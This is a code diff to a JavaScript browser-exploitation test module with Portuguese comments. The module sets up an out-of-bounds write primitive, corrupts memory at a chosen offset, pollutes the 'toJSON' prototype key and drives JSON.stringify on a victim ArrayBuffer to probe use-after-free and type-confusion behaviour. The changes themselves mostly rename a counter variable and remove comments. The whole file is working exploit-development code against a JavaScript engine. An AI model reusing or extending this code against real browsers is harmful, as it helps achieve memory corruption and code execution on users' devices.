@@ -15,12 +15,12 @@ const TARGETED_UAF_TC_PARAMS = {
     ppKeyToPollute: 'toJSON',
 };
 
-export let currentCallCount_for_UAF_TC_test = 0;
-const MAX_toJSON_DEPTH_FOR_ANALYSIS = 10; // Limite de profundidade para detailed_toJSON
+export let currentCallCount_for_UAF_TC_test = 0; // Esta é a variável global do contador
+const MAX_toJSON_DEPTH_FOR_ANALYSIS = 10; 
 
 // Esta é a toJSON que sonda 'this', tem controle de profundidade e tenta slice na Call 1
 export function detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice() {
-    currentCallCount_for_UAF_TC_test++;
+    currentCallCount_for_UAF_TC_test++; // Incrementa a variável global correta
     const currentOperationThis = this;
     const FNAME_toJSON_local = `detailed_toJSON_DepthCtrlSlice(Call ${currentCallCount_for_UAF_TC_test})`;
 
@@ -63,10 +63,9 @@ export function detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice() {
         logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] ACCESSO DIRETO this.byteLength: ${details.raw_byteLength} (tipo: ${details.type_of_raw_byteLength})`, "info");
         
         details.first_dword_attempt = "Tentado";
-        // Apenas tentar DataView se 'this' for um ArrayBuffer e tiver tamanho suficiente
         if (currentOperationThis instanceof ArrayBuffer && typeof details.raw_byteLength === 'number' && details.raw_byteLength >=4) {
             try {
-                let buffer_to_inspect = currentOperationThis; // this é ArrayBuffer
+                let buffer_to_inspect = currentOperationThis;
                 let offset_to_inspect = 0;
                 details.first_dword_value = new DataView(buffer_to_inspect, offset_to_inspect, 4).getUint32(0, true);
                 details.first_dword_attempt += ", DataView OK";
@@ -76,7 +75,6 @@ export function detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice() {
                 error_accessing_props = error_accessing_props || `DV AB Error: ${e_dv.message}`;
             }
         } else if (currentOperationThis && !(currentOperationThis instanceof ArrayBuffer) && typeof details.raw_byteLength === 'number' && details.raw_byteLength >=4 && currentOperationThis.buffer instanceof ArrayBuffer) {
-             // Caso seja um TypedArray com .buffer
             try {
                 if (currentOperationThis.buffer.byteLength >= (currentOperationThis.byteOffset || 0) + 4) {
                     details.first_dword_value = new DataView(currentOperationThis.buffer, (currentOperationThis.byteOffset || 0), 4).getUint32(0, true);
@@ -95,7 +93,6 @@ export function detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice() {
 
         details.slice_exists = (typeof currentOperationThis.slice === 'function');
         details.slice_call_attempt = "Tentado";
-        // Tentar chamar slice apenas na primeira chamada e se 'this' for um ArrayBuffer
         if (details.slice_exists && currentOperationThis instanceof ArrayBuffer && currentCallCount_for_UAF_TC_test === 1) {
             try {
                 logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] 'this.slice' existe (AB). Tentando chamar this.slice(0,1)...`, "info");
@@ -122,16 +119,14 @@ export function detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice() {
     }
     
     if (error_accessing_props) {
-        // Lançar erro para ser pego pelo try...catch em torno do JSON.stringify
         throw new Error(`Prop Access Error in toJSON_DCS Call ${currentCallCount_for_UAF_TC_test}: ${error_accessing_props}`);
     }
-    // Retornar um objeto que inclua 'details' para permitir recursão e inspeção
     return { toJSON_executed_detailed_depth_ctrl_slice: true, call: currentCallCount_for_UAF_TC_test, details: details };
 }
 
 export async function executeUAFTypeConfusionTestWithValue(
     testVariantDescription,
-    valueToWriteOOB // O valor OOB a ser escrito em TARGETED_UAF_TC_PARAMS.corruption_offset
+    valueToWriteOOB
 ) {
     const FNAME_TEST = `executeUAFTypeConfusionTest<${testVariantDescription}>`;
     const {
@@ -139,14 +134,14 @@ export async function executeUAFTypeConfusionTestWithValue(
         corruption_offset, 
         bytes_to_write_for_corruption,
         ppKeyToPollute,
-    } = TARGETED_UAF_TC_PARAMS; // corruption_offset é 0x70
+    } = TARGETED_UAF_TC_PARAMS;
 
     logS3(`--- Iniciando Teste UAF/TC (Valor Variado OOB, toJSON Detalhada com DepthCtrl+Slice): ${testVariantDescription} ---`, "test", FNAME_TEST);
     logS3(`   MAX_toJSON_DEPTH_FOR_ANALYSIS = ${MAX_toJSON_DEPTH_FOR_ANALYSIS}`, "info", FNAME_TEST);
     logS3(`   Alvo da Corrupção OOB: Offset=${toHex(corruption_offset)}, Valor OOB a Escrever=${toHex(valueToWriteOOB)}`, "info", FNAME_TEST);
     document.title = `Iniciando UAF/TC DCS: ${testVariantDescription}`;
 
-    callCount_detailed_toJSON = 0; // Resetar contador para este teste
+    currentCallCount_for_UAF_TC_test = 0; 
 
     let stringifyResult = null; 
     let errorOccurredDuringTest = null;
@@ -156,12 +151,12 @@ export async function executeUAFTypeConfusionTestWithValue(
     await triggerOOB_primitive();
     if (!oob_array_buffer_real) {
         logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
-        return { potentiallyFroze: false, errorOccurred: new Error("OOB Setup Failed"), calls: callCount_detailed_toJSON, stringifyResult };
+        return { potentiallyFroze: false, errorOccurred: new Error("OOB Setup Failed"), calls: currentCallCount_for_UAF_TC_test, stringifyResult };
     }
     document.title = "OOB Configurado";
     stepReached = "oob_configurado";
 
-    let victim_ab = new ArrayBuffer(victim_ab_size); // Este é o objeto que será passado para JSON.stringify
+    let victim_ab = new ArrayBuffer(victim_ab_size);
     logS3(`ArrayBuffer victim_ab (${victim_ab_size} bytes) recriado. Este será o 'this' na 1a chamada da toJSON.`, "info", FNAME_TEST);
     stepReached = "vitima_criada";
 
@@ -204,8 +199,8 @@ export async function executeUAFTypeConfusionTestWithValue(
             stepReached = "erro_stringify_victim_ab";
             document.title = `ERRO Stringify victim_ab (${e_stringify.name}) DCS: ${testVariantDescription}`;
             potentiallyFroze = false; 
-            errorOccurredDuringTest = e_stringify;
-            logS3(`ERRO CAPTURADO JSON.stringify(victim_ab): ${e_stringify.name} - ${e_stringify.message}. (Chamadas toJSON: ${callCount_detailed_toJSON})`, "critical", FNAME_TEST);
+            errorOccurredDuringTest = e_stringify; // Armazena o objeto de erro
+            logS3(`ERRO CAPTURADO JSON.stringify(victim_ab): ${e_stringify.name} - ${e_stringify.message}. (Chamadas toJSON: ${currentCallCount_for_UAF_TC_test})`, "critical", FNAME_TEST);
             if (e_stringify.stack) logS3(e_stringify.stack, "error", FNAME_TEST);
             console.error(`JSON.stringify Test Error for victim_ab (${testVariantDescription}):`, e_stringify);
         }
@@ -214,7 +209,7 @@ export async function executeUAFTypeConfusionTestWithValue(
         stepReached = "erro_principal";
         document.title = `ERRO Principal DCS: ${testVariantDescription}`;
         potentiallyFroze = false;
-        errorOccurredDuringTest = mainError; 
+        errorOccurredDuringTest = mainError; // Armazena o objeto de erro
         logS3(`Erro principal no teste (${testVariantDescription}): ${mainError.message}`, "error", FNAME_TEST);
         if (mainError.stack) logS3(mainError.stack, "error", FNAME_TEST);
         console.error("Main test error (DCS):", mainError);
@@ -227,17 +222,20 @@ export async function executeUAFTypeConfusionTestWithValue(
             }
         }
         clearOOBEnvironment();
-        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}. Chamadas toJSON: ${callCount_detailed_toJSON}.`, "info", FNAME_TEST);
+        // CORREÇÃO: Usar currentCallCount_for_UAF_TC_test consistentemente
+        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}. Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}.`, "info", FNAME_TEST);
         if (potentiallyFroze) {
-            logS3(`O TESTE PODE TER CONGELADO. Último passo: ${stepReached}. Chamadas toJSON: ${callCount_detailed_toJSON}`, "warn", FNAME_TEST);
-            document.title = `CONGELOU? DCS Depth ${MAX_toJSON_DEPTH_FOR_ANALYSIS} Passo: ${stepReached} - Chamadas: ${callCount_detailed_toJSON} - ${testVariantDescription}`;
+            logS3(`O TESTE PODE TER CONGELADO. Último passo: ${stepReached}. Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}`, "warn", FNAME_TEST);
+            document.title = `CONGELOU? DCS Depth ${MAX_toJSON_DEPTH_FOR_ANALYSIS} Passo: ${stepReached} - Chamadas: ${currentCallCount_for_UAF_TC_test} - ${testVariantDescription}`;
         }
     }
-    logS3(`--- Teste UAF/TC Concluído: ${testVariantDescription} (MAX_DEPTH=${MAX_toJSON_DEPTH_FOR_ANALYSIS}, Chamadas toJSON: ${callCount_detailed_toJSON}) ---`, "test", FNAME_TEST);
+    // CORREÇÃO: Usar currentCallCount_for_UAF_TC_test consistentemente
+    logS3(`--- Teste UAF/TC Concluído: ${testVariantDescription} (MAX_DEPTH=${MAX_toJSON_DEPTH_FOR_ANALYSIS}, Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}) ---`, "test", FNAME_TEST);
     if (!potentiallyFroze && !errorOccurredDuringTest) {
         document.title = `Teste UAF/TC DCS OK: ${testVariantDescription}`;
     } else if (errorOccurredDuringTest) {
         // Título já reflete o erro
     }
-    return { potentiallyFroze, errorOccurred: errorOccurredDuringTest, calls: callCount_detailed_toJSON, stringifyResult };
+    // CORREÇÃO: Usar currentCallCount_for_UAF_TC_test consistentemente
+    return { potentiallyFroze, errorOccurred: errorOccurredDuringTest, calls: currentCallCount_for_UAF_TC_test, stringifyResult };
 }
